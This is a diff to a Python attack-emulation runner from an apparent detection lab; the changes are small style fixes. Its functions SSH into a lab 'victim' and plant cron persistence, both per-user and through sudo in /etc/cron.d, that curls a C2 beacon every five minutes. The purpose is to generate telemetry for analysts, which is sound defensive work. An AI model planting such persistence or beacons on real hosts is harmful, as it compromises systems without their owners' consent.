@@ -66,7 +66,7 @@ def sh(cmd, timeout=45):
         # and DRAIN that loop's stdin, so the loop hits EOF and every chain step
         # after the first is silently skipped. Severing stdin keeps the whole
         # chain running.
-        subprocess.run(cmd, timeout=timeout, capture_output=True,
+        subprocess.run(cmd, check=False, timeout=timeout, capture_output=True,
                        stdin=subprocess.DEVNULL)
         return True
     except FileNotFoundError:
@@ -110,7 +110,7 @@ def ssh_victim(victim, remote, timeout=45, retries=3):
             # `while read … < <(runner --parse)` loop it would drain the loop's
             # input and skip every later chain step (see sh()). This is the real
             # cure for the "second technique never ran" flakiness.
-            r = subprocess.run(cmd, timeout=timeout, capture_output=True,
+            r = subprocess.run(cmd, check=False, timeout=timeout, capture_output=True,
                                stdin=subprocess.DEVNULL)
         except FileNotFoundError:
             print("  [ERR ] missing tool: sshpass/ssh")
@@ -200,8 +200,8 @@ def t1087_accounts(victim):
 def t1053_cron(victim):
     """Scheduled-task persistence the analyst can find on the host."""
     return ssh_victim(victim,
-               "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://%s/beacon') "
-               "| crontab -" % C2)
+               f"(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://{C2}/beacon') "
+               "| crontab -")
 
 
 def t1595_webscan(victim):
@@ -309,10 +309,10 @@ def t1053_rootcron(victim):
     cron.d write goes through sudo (COMMAND=... in auth.log — the persistence
     IOC); the beacons run on the victim so suricata-victim sees the flows."""
     ok = ssh_victim(victim,
-             "sudo bash -c \"printf '*/5 * * * * root curl -s http://%s/beacon\\n' "
+             f"sudo bash -c \"printf '*/5 * * * * root curl -s http://{C2}/beacon\\n' "
              "> /etc/cron.d/sys-refresh\"; "
              "sudo chmod 0644 /etc/cron.d/sys-refresh; "
-             "sudo ls -l /etc/cron.d/sys-refresh" % C2)
+             "sudo ls -l /etc/cron.d/sys-refresh")
     for _ in range(5):
         ok &= ssh_victim(victim, f"curl -s -o /dev/null --max-time 5 http://{C2}/beacon")
         time.sleep(2)
@@ -449,8 +449,8 @@ def main():
     action = ACTIONS.get(tech)
     if action is None:
         print(f"  [ERR ] no lab emulation for {tech}")
-        print(f"         Implement it in attacks/runner.py, or the scenario will")
-        print(f"         promise telemetry that never gets created.")
+        print("         Implement it in attacks/runner.py, or the scenario will")
+        print("         promise telemetry that never gets created.")
         return 2
     return 0 if action(victim) else 1
 
